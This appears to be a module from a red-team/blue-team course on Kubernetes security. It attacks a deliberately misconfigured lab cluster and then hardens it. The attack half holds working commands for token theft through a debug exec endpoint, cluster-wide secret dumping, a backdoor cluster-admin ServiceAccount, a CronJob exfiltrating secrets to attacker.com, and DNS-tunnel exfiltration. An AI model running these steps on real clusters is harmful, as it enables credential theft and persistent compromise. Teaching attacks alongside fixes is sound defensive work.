# The Red Team Lab — Full Kill Chain, Full Hardening

> **Module 12 · Course 38** — Everything in this course has been building to this moment. This module walks you through a deliberately misconfigured Kubernetes cluster: first as the attacker who finds and exploits every weakness, then as the defender who patches each hole. By the end, you will have personally executed a full kill chain AND built the complete hardening stack that stops it. This is what security mastery looks like.

---

## The Vulnerable Cluster — Planted Misconfigurations

The lab cluster (`dojo-sec-boss` namespace) has the following deliberate vulnerabilities. As an attacker, you'll find these by enumeration. As a defender, you'll fix every single one.

```
VULNERABILITY MAP
─────────────────
1. Default ServiceAccount has cluster-admin ClusterRoleBinding
   Impact: ANY pod in dojo-sec-boss has unrestricted cluster access
   Where: ClusterRoleBinding "dangerous-crb"

2. Pod "exposed-app" has automountServiceAccountToken: true (default)
   Impact: cluster-admin token is mounted into the pod and readable
   Where: Deployment "exposed-app"

3. No NetworkPolicy on dojo-sec-boss
   Impact: pod can reach IMDS, the K8s API, and all other namespaces
   Where: absence of NetworkPolicy resources

4. Secret "crown-jewels" in dojo-sec-boss-vault is readable via stolen token
   Impact: sensitive credential exfil
   Where: cluster-admin access covers all namespaces

5. No Pod Security Standards enforced
   Impact: privileged containers can be deployed
   Where: absence of pod-security.kubernetes.io label on namespace
```

---

## PART 1: THE ATTACK

Approach this as a red teamer on an engagement. Your starting point: you have `kubectl` access with minimal permissions (a ServiceAccount in `dojo-sec-entry` that can only list pods in `dojo-sec-boss`). That's it.

---

### Step 1: Initial Reconnaissance

```bash
# You have a minimal kubeconfig — set KUBECONFIG to it
export KUBECONFIG=/path/to/entry-kubeconfig.yaml

# What can you see?
kubectl auth can-i --list
# Resources Non-Resource URLs
# pods                              []
# (only pods, only in dojo-sec-boss)

# List the pods in dojo-sec-boss
kubectl get pods -n dojo-sec-boss
# NAME            READY   STATUS    RESTARTS
# exposed-app-xxx  1/1    Running   0

# Interesting. What runs in that pod?
kubectl get pod exposed-app-xxx -n dojo-sec-boss -o yaml
# spec.serviceAccountName: default
# spec.automountServiceAccountToken: not set (defaults to true)
# → Token IS mounted
```

**What you've learned:** There's a pod with the default SA token mounted. The default SA might have useful permissions.

---

### Step 2: Gaining a Foothold — Token Theft via kubectl exec

Wait — you can list pods but not exec. Can you do anything else?

```bash
# Check what operations you can do on pods
kubectl auth can-i create pods/exec -n dojo-sec-boss
# no

# However: what if the pod has a readiness probe that exposes a web shell?
# Or what if it's a debug pod with exec enabled?
# In this lab: there IS an exec path via port-forward + a debug endpoint
kubectl port-forward pod/exposed-app-xxx 8080:8080 -n dojo-sec-boss &
curl http://localhost:8080/debug/exec?cmd=id
# uid=1000(app) gid=1000(app) groups=1000(app)

# This debug endpoint can run commands. Use it to read the SA token:
curl "http://localhost:8080/debug/exec?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token"
# eyJhbGciOiJSUzI1NiIsImtpZCI6Ii...  ← the cluster-admin token
```

**Alternatively** (if exec permission was granted):

```bash
kubectl exec -n dojo-sec-boss exposed-app-xxx -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/stolen-token
```

---

### Step 3: Privilege Discovery — What Does This Token Do?

```bash
STOLEN_TOKEN=$(cat /tmp/stolen-token)

# What is this SA?
kubectl --token=$STOLEN_TOKEN auth whoami
# serviceaccount/dojo-sec-boss/default

# What can it do?
kubectl --token=$STOLEN_TOKEN auth can-i --list
# Resources  Non-Resource URLs
# *.*        [*]
# → ClusterRole cluster-admin: can do ANYTHING

echo "[!] Got cluster-admin. Full cluster access achieved."
```

This is the moment a real attacker would stop being subtle and start moving fast — they have everything.

---

### Step 4: Lateral Movement — Enumerate the Entire Cluster

```bash
# Full cluster secret dump
kubectl --token=$STOLEN_TOKEN get secrets --all-namespaces | head -40

# Interesting namespaces
kubectl --token=$STOLEN_TOKEN get namespaces
# dojo-sec-boss
# dojo-sec-boss-vault   ← new namespace!
# dojo-sec-lateral
# dojo-sec-forensics
# kube-system
# ...

# Target the crown jewels
kubectl --token=$STOLEN_TOKEN get secrets -n dojo-sec-boss-vault
# NAME           TYPE     DATA
# crown-jewels   Opaque   1

kubectl --token=$STOLEN_TOKEN get secret crown-jewels \
  -n dojo-sec-boss-vault \
  -o jsonpath='{.data.secret}' | base64 -d
# Attack flag discovered
```

---

### Step 5: Persistence — Planting a Backdoor (Red Team Exercise)

A real attacker wouldn't stop at reading secrets — they'd ensure they can come back:

```bash
# Plant a backdoor ServiceAccount with cluster-admin
kubectl --token=$STOLEN_TOKEN apply -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: backup-reader
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: backup-reader-binding
subjects:
- kind: ServiceAccount
  name: backup-reader
  namespace: kube-system
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

# Plant a CronJob that exfils to attacker's server every hour
kubectl --token=$STOLEN_TOKEN apply -f - <<EOF
apiVersion: batch/v1
kind: CronJob
metadata:
  name: backup-sync
  namespace: kube-system
spec:
  schedule: "0 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: backup-reader
          containers:
          - name: sync
            image: bitnami/kubectl:latest
            command: [sh, -c, "kubectl get secrets --all-namespaces -o json | curl -X POST https://attacker.com/collect -d @-"]
          restartPolicy: OnFailure
EOF
```

---

### Step 6: Data Exfiltration — DNS Tunneling

```bash
# Encode the stolen secret and exfil via DNS
SECRET_B64=$(kubectl --token=$STOLEN_TOKEN get secret crown-jewels \
  -n dojo-sec-boss-vault \
  -o jsonpath='{.data.secret}')

# Split and exfil
echo $SECRET_B64 | fold -w60 | while read chunk; do
  nslookup "${chunk}.exfil.attacker.com" 1.2.3.4 &>/dev/null
done
echo "[+] Exfiltration complete via DNS"
```

---

## PART 2: THE HARDENING

Now flip to blue team. You just attacked this cluster. You know exactly what's broken. Fix every single vulnerability.

---

### Fix 1: Remove the Dangerous ClusterRoleBinding

```bash
# This is the root cause of the entire attack
kubectl delete clusterrolebinding dangerous-crb

# Verify: default SA in dojo-sec-boss can no longer do anything
kubectl --token=$STOLEN_TOKEN auth can-i get secrets -n dojo-sec-boss-vault
# no
```

### Fix 2: Disable SA Token Auto-mounting

```bash
# Patch the default SA to not auto-mount tokens
kubectl patch serviceaccount default -n dojo-sec-boss \
  -p '{"automountServiceAccountToken": false}'

# Also patch the deployment to explicitly opt out
kubectl patch deployment exposed-app -n dojo-sec-boss \
  -p '{"spec":{"template":{"spec":{"automountServiceAccountToken": false}}}}'

# Verify: new pods from this deployment won't have a token mounted
kubectl rollout restart deployment/exposed-app -n dojo-sec-boss
kubectl exec -n dojo-sec-boss $(kubectl get pod -n dojo-sec-boss -l app=exposed-app -o jsonpath='{.items[0].metadata.name}') -- \
  ls /var/run/secrets/ 2>&1 || echo "No secrets mounted"
```

### Fix 3: Default-Deny NetworkPolicy

```bash
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: dojo-sec-boss
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
EOF

# Allow egress only to kube-apiserver (for legitimate kubectl calls)
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-kube-api-egress
  namespace: dojo-sec-boss
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
  - ports:
    - port: 443
      protocol: TCP
    - port: 6443
      protocol: TCP
EOF
```

### Fix 4: Rotate the Crown Jewels

```bash
# Delete the exposed secret and recreate with a new value
kubectl delete secret crown-jewels -n dojo-sec-boss-vault

kubectl create secret generic crown-jewels \
  -n dojo-sec-boss-vault \
  --from-literal=secret="$(openssl rand -base64 32)"

echo "[+] Crown jewels rotated — previous exposure invalidated"
```

### Fix 5: Enforce Pod Security Standards

```bash
# Apply restricted PSS to the namespace
kubectl label namespace dojo-sec-boss \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/warn=restricted

# Verify: try to deploy a privileged container
kubectl run test-priv -n dojo-sec-boss \
  --image=nginx \
  --overrides='{"spec":{"containers":[{"name":"nginx","image":"nginx","securityContext":{"privileged":true}}]}}'
# Error: pods "test-priv" is forbidden: violates PodSecurity "restricted:latest"
```

### Fix 6: Remove Backdoors

```bash
# Find and remove all attacker-planted resources
kubectl delete clusterrolebinding backup-reader-binding 2>/dev/null || true
kubectl delete serviceaccount backup-reader -n kube-system 2>/dev/null || true
kubectl delete cronjob backup-sync -n kube-system 2>/dev/null || true

# Audit all ClusterRoleBindings to cluster-admin
kubectl get clusterrolebindings -o json \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for item in d['items']:
  if 'cluster-admin' in item.get('roleRef', {}).get('name', ''):
    subjects = item.get('subjects', [])
    print(item['metadata']['name'], '->', [s.get('name') for s in subjects])
"
```

---

## Hardening Summary Table

| Attack Step | Technique | Hardening Control | Detection |
|-------------|-----------|------------------|-----------|
| Pod enumeration | List pods via entry SA | Principle of least privilege on entry SA | Audit log: list pods |
| Token theft | SA token mounted in pod | automountServiceAccountToken: false | Audit log: port-forward |
| Privilege escalation | Default SA has cluster-admin | Remove over-permissioned CRBs | Audit log: auth can-i |
| Lateral movement | Stolen token reads all namespaces | RBAC namespace-scoped roles only | Audit log: cross-ns secrets access |
| Data exfiltration | DNS tunneling | Egress NetworkPolicy + DNS monitoring | Falco: unusual DNS patterns |
| Persistence | Backdoor SA + CronJob | Regular RBAC audits, Kyverno: block CronJobs in kube-system | Audit log: SA creation in kube-system |

---

## Verification Checklist

Before calling the cluster "hardened", verify each control:

```bash
# 1. ClusterRoleBinding removed
kubectl get clusterrolebinding dangerous-crb 2>&1 | grep "not found"

# 2. SA token auto-mount disabled
kubectl get serviceaccount default -n dojo-sec-boss \
  -o jsonpath='{.automountServiceAccountToken}'
# false

# 3. NetworkPolicy in place
kubectl get networkpolicy -n dojo-sec-boss
# default-deny-all, allow-kube-api-egress

# 4. Crown jewels rotated (new secret exists)
kubectl get secret crown-jewels -n dojo-sec-boss-vault

# 5. No privileged pods allowed
kubectl get pods -n dojo-sec-boss -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].securityContext.privileged}{"\n"}{end}'
# Should show empty (false) for privileged field

# 6. No attacker backdoors
kubectl get clusterrolebinding backup-reader-binding 2>&1 | grep "not found"
kubectl get cronjob backup-sync -n kube-system 2>&1 | grep "not found"
```

---

## Final Summary: The Complete Security Stack

After completing this course, you've built the following layers of defense:

```
DEFENSE IN DEPTH — CLOUD-NATIVE SECURITY

Layer 1: Supply Chain
  ├─ Trivy/Snyk scanning in CI (no CVEs in images)
  ├─ cosign image signing (only signed images run)
  └─ Kyverno: verify-images policy (enforced in cluster)

Layer 2: Admission Control
  ├─ OPA Gatekeeper: block privileged, hostPath, root containers
  ├─ Kyverno: block latest tags, enforce resource limits, verify signatures
  └─ Pod Security Standards: restricted mode on production namespaces

Layer 3: Network
  ├─ Default-deny NetworkPolicy in every namespace
  ├─ Explicit allow rules for required communication only
  └─ Egress block for 169.254.169.254 (IMDS)

Layer 4: Workload Identity
  ├─ SPIFFE/SPIRE: cryptographic identity per workload
  ├─ mTLS enforced (Istio PeerAuthentication: STRICT)
  └─ IRSA/Workload Identity: pod-level cloud IAM

Layer 5: Secrets
  ├─ Vault dynamic secrets (no static credentials)
  ├─ Short TTLs + automatic rotation
  └─ ESO: K8s secrets synced from Vault, not hand-written

Layer 6: Runtime Detection
  ├─ Falco DaemonSet with custom rules
  ├─ Kubernetes audit logging (all secret reads, exec, RBAC changes)
  └─ Falcosidekick → PagerDuty (immediate alerting)

Layer 7: Cluster Hardening
  ├─ kube-bench CIS Level 1 all PASS
  ├─ RBAC: least-privilege, no over-permissioned ClusterRoleBindings
  └─ No anonymous auth, audit logging enabled, etcd encrypted at rest

Layer 8: Incident Response
  ├─ PICERL playbook documented and rehearsed
  ├─ Evidence collection automated (kubectl describe + logs → S3)
  └─ Post-incident review → new controls added
```

Congratulations — you've completed Course 38: Red Team / Blue Team: Cloud-Native Security Mastery. You've walked the full kill chain as an attacker and built the full defense stack as a defender. Apply these skills carefully and ethically.
